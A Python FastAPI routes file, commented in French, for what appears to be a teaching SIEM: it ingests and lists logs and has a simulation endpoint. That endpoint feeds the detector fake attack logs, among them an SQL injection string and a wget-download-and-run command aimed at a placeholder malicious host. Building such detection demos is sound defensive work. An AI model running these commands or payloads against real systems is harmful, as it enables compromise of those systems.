"""
Routes API - Logs
Endpoints pour ingérer et consulter les logs
"""

from fastapi import APIRouter, Depends, HTTPException, UploadFile, File, Query
from sqlalchemy.orm import Session
from sqlalchemy import desc
from typing import List, Optional
from app.core.database import get_db
from app.models.models import LogEntry
from app.schemas.schemas import LogEntryCreate, LogEntryResponse, LogBulkCreate
from app.services.ingestion import LogIngestionService

router = APIRouter()


@router.post("/", summary="Ingérer un log unique")
def ingest_log(log_data: LogEntryCreate, db: Session = Depends(get_db)):
    """
    Reçoit un log, le stocke, et déclenche l'analyse par le Rule Engine.
    Retourne les alertes éventuellement créées.
    """
    service = LogIngestionService(db)
    result  = service.ingest_single(log_data)
    return result


@router.post("/bulk", summary="Ingérer plusieurs logs (JSON)")
def ingest_bulk(bulk_data: LogBulkCreate, db: Session = Depends(get_db)):
    """Import en masse via JSON. Utile pour rejouer des logs historiques."""
    service = LogIngestionService(db)
    return service._process_bulk([log.dict() for log in bulk_data.logs])


@router.post("/upload/csv", summary="Upload fichier CSV de logs")
async def upload_csv(file: UploadFile = File(...), db: Session = Depends(get_db)):
    """Upload et traitement d'un fichier CSV de logs"""
    if not file.filename.endswith(".csv"):
        raise HTTPException(status_code=400, detail="Fichier CSV requis")
    content = (await file.read()).decode("utf-8")
    service = LogIngestionService(db)
    return service.ingest_bulk_csv(content)


@router.post("/upload/json", summary="Upload fichier JSON de logs")
async def upload_json(file: UploadFile = File(...), db: Session = Depends(get_db)):
    """Upload et traitement d'un fichier JSON de logs"""
    content = (await file.read()).decode("utf-8")
    service = LogIngestionService(db)
    return service.ingest_bulk_json(content)


@router.get("/", response_model=List[LogEntryResponse], summary="Lister les logs")
def get_logs(
    skip       : int = Query(0, ge=0),
    limit      : int = Query(50, le=500),
    source_ip  : Optional[str] = None,
    event_type : Optional[str] = None,
    db         : Session = Depends(get_db)
):
    """
    Récupère les logs avec pagination et filtres optionnels.
    Les SIEMs réels permettent exactement ce type de recherche (ex: Splunk SPL, KQL pour Sentinel).
    """
    query = db.query(LogEntry).order_by(desc(LogEntry.timestamp))
    if source_ip:
        query = query.filter(LogEntry.source_ip == source_ip)
    if event_type:
        query = query.filter(LogEntry.event_type == event_type)
    return query.offset(skip).limit(limit).all()


@router.get("/simulate", summary="Générer des logs de test")
def simulate_logs(db: Session = Depends(get_db)):
    """
    Génère des logs de test pour démontrer la détection.
    Utile pour les démos et les tests.
    
    Simule :
    - Un brute force SSH (5 login_failed rapides)
    - Une tentative SQLi
    - Une commande suspecte
    """
    from datetime import datetime, timedelta
    import random

    service = LogIngestionService(db)
    simulated = []

    # 1. Brute Force : 6 login_failed depuis la même IP
    attacker_ip = f"10.0.0.{random.randint(100, 200)}"
    for i in range(6):
        simulated.append(LogEntryCreate(
            source_ip  = attacker_ip,
            dest_ip    = "192.168.1.1",
            dest_port  = 22,
            protocol   = "TCP",
            event_type = "login_failed",
            message    = f"Authentication failure for user root from {attacker_ip} port 4{i}200",
            hostname   = "web-server-01",
            username   = "root"
        ))

    # 2. Tentative SQLi
    simulated.append(LogEntryCreate(
        source_ip  = f"203.0.113.{random.randint(1,254)}",
        dest_ip    = "192.168.1.10",
        dest_port  = 80,
        protocol   = "TCP",
        event_type = "http_request",
        message    = "GET /login?user=admin'--&pass=x HTTP/1.1 UNION SELECT username,password FROM users",
        hostname   = "web-app-01"
    ))

    # 3. Commande suspecte
    simulated.append(LogEntryCreate(
        source_ip  = f"172.16.0.{random.randint(1,50)}",
        dest_ip    = "192.168.1.20",
        event_type = "command_exec",
        message    = "bash -c 'wget http://malicious.xyz/payload.sh && chmod 777 payload.sh && ./payload.sh'",
        hostname   = "app-server-02",
        username   = "www-data"
    ))

    results = []
    for log_data in simulated:
        result = service.ingest_single(log_data)
        results.append(result)

    total_alerts = sum(r["alerts_created"] for r in results)
    return {
        "message"        : f"{len(simulated)} logs simulés injectés",
        "alerts_created" : total_alerts,
        "details"        : results
    }
